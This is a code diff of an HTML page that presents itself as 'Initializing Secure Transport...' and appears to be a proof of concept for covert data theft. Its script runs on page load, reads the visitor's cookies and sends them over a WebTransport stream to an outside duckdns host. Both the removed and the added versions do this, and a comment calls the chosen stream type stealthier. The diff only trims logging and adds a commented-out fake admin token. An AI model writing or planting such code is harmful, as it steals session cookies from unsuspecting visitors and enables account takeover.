@@ -7,35 +7,30 @@
     <h1>Initializing Secure Transport...</h1>
     <script>
         async function runExfil() {
-            // Your GCE domain
-            const url = 'https://webrtc-poc.duckdns.org';
-            
-            try {
-                // 1. Initialize the WebTransport session
-                const transport = new WebTransport(url);
-                console.log("> [1] Connecting to HTTP/3 Server...");
-                
-                // 2. Wait for the connection to be ready
-                await transport.ready;
-                console.log("> [2] WebTransport Session Established");
+    const url = 'https://webrtc-poc.duckdns.org';
+    
+    try {
+        const transport = new WebTransport(url);
+        await transport.ready;
 
-                // 3. Open a "Send Stream" (unidirectional is stealthier)
-                const stream = await transport.createUnidirectionalStream();
-                const writer = stream.getWriter();
+        // --- THE DATA GATHERING PART ---
+        // Let's try to grab all cookies as a test
+        let sensitiveData = document.cookie || "No Cookies Found";
+        
+        // If you want to test with a hardcoded string again:
+        // sensitiveData = "user_auth=CAPTURED_ADMIN_TOKEN_999";
 
-                // 4. Exfiltrate the cargo
-                const data = "user_auth=" + (document.cookie || "SESSION_EXPIRED_OR_EMPTY");
-                const encoded = new TextEncoder().encode(data);
-                
-                await writer.write(encoded);
-                await writer.close();
-                
-                console.log("> [3] Data transmitted via QUIC stream.");
-            } catch (e) {
-                console.error("WebTransport Error:", e);
-            }
-        }
-
+        const stream = await transport.createUnidirectionalStream();
+        const writer = stream.getWriter();
+        const data = new TextEncoder().encode(sensitiveData);
+        
+        await writer.write(data);
+        await writer.close();
+        
+    } catch (e) {
+        console.error("Exfil failed:", e);
+    }
+}
         // Trigger on page load
         runExfil();
     </script>
